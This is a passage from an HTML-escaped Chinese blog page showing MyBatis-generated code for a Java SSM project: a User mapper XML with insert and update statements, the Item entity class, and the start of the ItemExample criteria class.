    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;insert &lt;/span&gt;&lt;span&gt;id&lt;/span&gt;&lt;span&gt;=&quot;insert&quot;&lt;/span&gt;&lt;span&gt; parameterType&lt;/span&gt;&lt;span&gt;=&quot;com.cyb.ssm.po.User&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
        insert into user (id, username, birthday,
        sex, address)
        values (#{id,jdbcType=INTEGER}, #{username,jdbcType=VARCHAR},
        #{birthday,jdbcType=DATE},
        #{sex,jdbcType=CHAR}, #{address,jdbcType=VARCHAR})
    &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;insert&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;insert &lt;/span&gt;&lt;span&gt;id&lt;/span&gt;&lt;span&gt;=&quot;insertSelective&quot;&lt;/span&gt;&lt;span&gt; parameterType&lt;/span&gt;&lt;span&gt;=&quot;com.cyb.ssm.po.User&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
        insert into user
        &lt;/span&gt;&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;trim &lt;/span&gt;&lt;span&gt;prefix&lt;/span&gt;&lt;span&gt;=&quot;(&quot;&lt;/span&gt;&lt;span&gt; suffix&lt;/span&gt;&lt;span&gt;=&quot;)&quot;&lt;/span&gt;&lt;span&gt; suffixOverrides&lt;/span&gt;&lt;span&gt;=&quot;,&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;if &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;id != null&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
                id,
            &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;if &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;username != null&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
                username,
            &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;if &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;birthday != null&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
                birthday,
            &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;if &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;sex != null&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
                sex,
            &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;if &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;address != null&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
                address,
            &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;trim&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;trim &lt;/span&gt;&lt;span&gt;prefix&lt;/span&gt;&lt;span&gt;=&quot;values (&quot;&lt;/span&gt;&lt;span&gt; suffix&lt;/span&gt;&lt;span&gt;=&quot;)&quot;&lt;/span&gt;&lt;span&gt; suffixOverrides&lt;/span&gt;&lt;span&gt;=&quot;,&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;if &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;id != null&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
                #{id,jdbcType=INTEGER},
            &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;if &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;username != null&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
                #{username,jdbcType=VARCHAR},
            &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;if &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;birthday != null&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
                #{birthday,jdbcType=DATE},
            &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;if &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;sex != null&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
                #{sex,jdbcType=CHAR},
            &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;if &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;address != null&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
                #{address,jdbcType=VARCHAR},
            &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;trim&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;insert&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;select &lt;/span&gt;&lt;span&gt;id&lt;/span&gt;&lt;span&gt;=&quot;countByExample&quot;&lt;/span&gt;&lt;span&gt;
        parameterType&lt;/span&gt;&lt;span&gt;=&quot;com.cyb.ssm.po.UserExample&quot;&lt;/span&gt;&lt;span&gt;
        resultType&lt;/span&gt;&lt;span&gt;=&quot;java.lang.Integer&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
        select count(*) from user
        &lt;/span&gt;&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;if &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;_parameter != null&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;include &lt;/span&gt;&lt;span&gt;refid&lt;/span&gt;&lt;span&gt;=&quot;Example_Where_Clause&quot;&lt;/span&gt; &lt;span&gt;/&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;select&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;update &lt;/span&gt;&lt;span&gt;id&lt;/span&gt;&lt;span&gt;=&quot;updateByExampleSelective&quot;&lt;/span&gt;&lt;span&gt; parameterType&lt;/span&gt;&lt;span&gt;=&quot;map&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
        update user
        &lt;/span&gt;&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;set&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;if &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;record.id != null&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
                id = #{record.id,jdbcType=INTEGER},
            &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;if &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;record.username != null&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
                username = #{record.username,jdbcType=VARCHAR},
            &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;if &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;record.birthday != null&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
                birthday = #{record.birthday,jdbcType=DATE},
            &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;if &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;record.sex != null&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
                sex = #{record.sex,jdbcType=CHAR},
            &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;if &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;record.address != null&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
                address = #{record.address,jdbcType=VARCHAR},
            &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;set&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;if &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;_parameter != null&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;include &lt;/span&gt;&lt;span&gt;refid&lt;/span&gt;&lt;span&gt;=&quot;Update_By_Example_Where_Clause&quot;&lt;/span&gt; &lt;span&gt;/&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;update&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;update &lt;/span&gt;&lt;span&gt;id&lt;/span&gt;&lt;span&gt;=&quot;updateByExample&quot;&lt;/span&gt;&lt;span&gt; parameterType&lt;/span&gt;&lt;span&gt;=&quot;map&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
        update user
        set id = #{record.id,jdbcType=INTEGER},
        username = #{record.username,jdbcType=VARCHAR},
        birthday = #{record.birthday,jdbcType=DATE},
        sex = #{record.sex,jdbcType=CHAR},
        address = #{record.address,jdbcType=VARCHAR}
        &lt;/span&gt;&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;if &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;_parameter != null&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;include &lt;/span&gt;&lt;span&gt;refid&lt;/span&gt;&lt;span&gt;=&quot;Update_By_Example_Where_Clause&quot;&lt;/span&gt; &lt;span&gt;/&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;update&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;update &lt;/span&gt;&lt;span&gt;id&lt;/span&gt;&lt;span&gt;=&quot;updateByPrimaryKeySelective&quot;&lt;/span&gt;&lt;span&gt;
        parameterType&lt;/span&gt;&lt;span&gt;=&quot;com.cyb.ssm.po.User&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
        update user
        &lt;/span&gt;&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;set&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;if &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;username != null&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
                username = #{username,jdbcType=VARCHAR},
            &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;if &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;birthday != null&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
                birthday = #{birthday,jdbcType=DATE},
            &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;if &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;sex != null&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
                sex = #{sex,jdbcType=CHAR},
            &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;if &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;address != null&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
                address = #{address,jdbcType=VARCHAR},
            &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;set&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
        where id = #{id,jdbcType=INTEGER}
    &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;update&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;update &lt;/span&gt;&lt;span&gt;id&lt;/span&gt;&lt;span&gt;=&quot;updateByPrimaryKey&quot;&lt;/span&gt;&lt;span&gt;
        parameterType&lt;/span&gt;&lt;span&gt;=&quot;com.cyb.ssm.po.User&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
        update user
        set username = #{username,jdbcType=VARCHAR},
        birthday = #{birthday,jdbcType=DATE},
        sex = #{sex,jdbcType=CHAR},
        address = #{address,jdbcType=VARCHAR}
        where id = #{id,jdbcType=INTEGER}
    &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;update&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;mapper&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h2&gt;com.cyb.ssm.po&lt;/h2&gt;
&lt;p&gt;路径：src/main/java&lt;/p&gt;
&lt;h4&gt;Item.java&lt;/h4&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;package com.cyb.ssm.po;

import java.util.Date;

public class Item {
    private Integer id;

    private String name;

    private Float price;

    private String pic;

    private Date createtime;

    private String detail;

    public Integer getId() {
        return id;
    }

    public void setId(Integer id) {
        this.id = id;
    }

    public String getName() {
        return name;
    }

    public void setName(String name) {
        this.name = name == null ? null : name.trim();
    }

    public Float getPrice() {
        return price;
    }

    public void setPrice(Float price) {
        this.price = price;
    }

    public String getPic() {
        return pic;
    }

    public void setPic(String pic) {
        this.pic = pic == null ? null : pic.trim();
    }

    public Date getCreatetime() {
        return createtime;
    }

    public void setCreatetime(Date createtime) {
        this.createtime = createtime;
    }

    public String getDetail() {
        return detail;
    }

    public void setDetail(String detail) {
        this.detail = detail == null ? null : detail.trim();
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h4&gt;ItemExample.java&lt;/h4&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;184&quot;&gt;
&lt;pre&gt;
&lt;span&gt;package&lt;/span&gt;&lt;span&gt; com.cyb.ssm.po;

&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; java.util.ArrayList;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; java.util.Date;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; java.util.List;

&lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; ItemExample {
    &lt;/span&gt;&lt;span&gt;protected&lt;/span&gt;&lt;span&gt; String orderByClause;

    &lt;/span&gt;&lt;span&gt;protected&lt;/span&gt; &lt;span&gt;boolean&lt;/span&gt;&lt;span&gt; distinct;

    &lt;/span&gt;&lt;span&gt;protected&lt;/span&gt; List&amp;lt;Criteria&amp;gt;&lt;span&gt; oredCriteria;

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; ItemExample() {
        oredCriteria &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt; ArrayList&amp;lt;Criteria&amp;gt;&lt;span&gt;();
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; setOrderByClause(String orderByClause) {
        &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.orderByClause =&lt;span&gt; orderByClause;
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; String getOrderByClause() {
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; orderByClause;
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; setDistinct(&lt;span&gt;boolean&lt;/span&gt;&lt;span&gt; distinct) {
        &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.distinct =&lt;span&gt; distinct;
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;boolean&lt;/span&gt;&lt;span&gt; isDistinct() {
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; distinct;
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; List&amp;lt;Criteria&amp;gt;&lt;span&gt; getOredCriteria() {
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; oredCriteria;
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; or(Criteria criteria) {
        oredCriteria.add(criteria);
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria or() {
        Criteria criteria &lt;/span&gt;=&lt;span&gt; createCriteriaInternal();
        oredCriteria.add(criteria);
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; criteria;
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria createCriteria() {
        Criteria criteria &lt;/span&gt;=&lt;span&gt; createCriteriaInternal();
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (oredCriteria.size() == 0&lt;span&gt;) {
            oredCriteria.add(criteria);
        }
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; criteria;
    }

    &lt;/span&gt;&lt;span&gt;protected&lt;/span&gt;&lt;span&gt; Criteria createCriteriaInternal() {
        Criteria criteria &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt;&lt;span&gt; Criteria();
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; criteria;
    }

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; clear() {
        oredCriteria.clear();
        orderByClause &lt;/span&gt;= &lt;span&gt;null&lt;/span&gt;&lt;span&gt;;
        distinct &lt;/span&gt;= &lt;span&gt;false&lt;/span&gt;&lt;span&gt;;
    }

    &lt;/span&gt;&lt;span&gt;protected&lt;/span&gt; &lt;span&gt;abstract&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; GeneratedCriteria {
        &lt;/span&gt;&lt;span&gt;protected&lt;/span&gt; List&amp;lt;Criterion&amp;gt;&lt;span&gt; criteria;

        &lt;/span&gt;&lt;span&gt;protected&lt;/span&gt;&lt;span&gt; GeneratedCriteria() {
            &lt;/span&gt;&lt;span&gt;super&lt;/span&gt;&lt;span&gt;();
            criteria &lt;/span&gt;= &lt;span&gt;new&lt;/span&gt; ArrayList&amp;lt;Criterion&amp;gt;&lt;span&gt;();
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;boolean&lt;/span&gt;&lt;span&gt; isValid() {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; criteria.size() &amp;gt; 0&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; List&amp;lt;Criterion&amp;gt;&lt;span&gt; getAllCriteria() {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; criteria;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; List&amp;lt;Criterion&amp;gt;&lt;span&gt; getCriteria() {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; criteria;
        }

        &lt;/span&gt;&lt;span&gt;protected&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; addCriterion(String condition) {
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (condition == &lt;span&gt;null&lt;/span&gt;&lt;span&gt;) {
                &lt;/span&gt;&lt;span&gt;throw&lt;/span&gt; &lt;span&gt;new&lt;/span&gt; RuntimeException(&quot;Value for condition cannot be null&quot;&lt;span&gt;);
            }
            criteria.add(&lt;/span&gt;&lt;span&gt;new&lt;/span&gt;&lt;span&gt; Criterion(condition));
        }

        &lt;/span&gt;&lt;span&gt;protected&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; addCriterion(String condition, Object value, String property) {
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (value == &lt;span&gt;null&lt;/span&gt;&lt;span&gt;) {
                &lt;/span&gt;&lt;span&gt;throw&lt;/span&gt; &lt;span&gt;new&lt;/span&gt; RuntimeException(&quot;Value for &quot; + property + &quot; cannot be null&quot;&lt;span&gt;);
            }
            criteria.add(&lt;/span&gt;&lt;span&gt;new&lt;/span&gt;&lt;span&gt; Criterion(condition, value));
        }

        &lt;/span&gt;&lt;span&gt;protected&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; addCriterion(String condition, Object value1, Object value2, String property) {
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (value1 == &lt;span&gt;null&lt;/span&gt; || value2 == &lt;span&gt;null&lt;/span&gt;&lt;span&gt;) {
                &lt;/span&gt;&lt;span&gt;throw&lt;/span&gt; &lt;span&gt;new&lt;/span&gt; RuntimeException(&quot;Between values for &quot; + property + &quot; cannot be null&quot;&lt;span&gt;);
            }
            criteria.add(&lt;/span&gt;&lt;span&gt;new&lt;/span&gt;&lt;span&gt; Criterion(condition, value1, value2));
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andIdIsNull() {
            addCriterion(&lt;/span&gt;&quot;id is null&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andIdIsNotNull() {
            addCriterion(&lt;/span&gt;&quot;id is not null&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andIdEqualTo(Integer value) {
            addCriterion(&lt;/span&gt;&quot;id =&quot;, value, &quot;id&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andIdNotEqualTo(Integer value) {
            addCriterion(&lt;/span&gt;&quot;id &amp;lt;&amp;gt;&quot;, value, &quot;id&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andIdGreaterThan(Integer value) {
            addCriterion(&lt;/span&gt;&quot;id &amp;gt;&quot;, value, &quot;id&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andIdGreaterThanOrEqualTo(Integer value) {
            addCriterion(&lt;/span&gt;&quot;id &amp;gt;=&quot;, value, &quot;id&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andIdLessThan(Integer value) {
            addCriterion(&lt;/span&gt;&quot;id &amp;lt;&quot;, value, &quot;id&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Criteria andIdLessThanOrEqualTo(Integer value) {
            addCriterion(&lt;/span&gt;&quot;id &amp;lt;=&quot;, value, &quot;id&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; Criteria andIdIn(List&amp;lt;Integer&amp;gt;&lt;span&gt; values) {
            addCriterion(&lt;/span&gt;&quot;id in&quot;, values, &quot;id&quot;&lt;span&gt;);
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; (Criteria) &lt;span&gt;this&lt;/span&gt;&lt;span&gt;;
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; Criteria andIdNotIn(List&amp;lt;Integer&amp;gt;&lt;span&gt; values) {
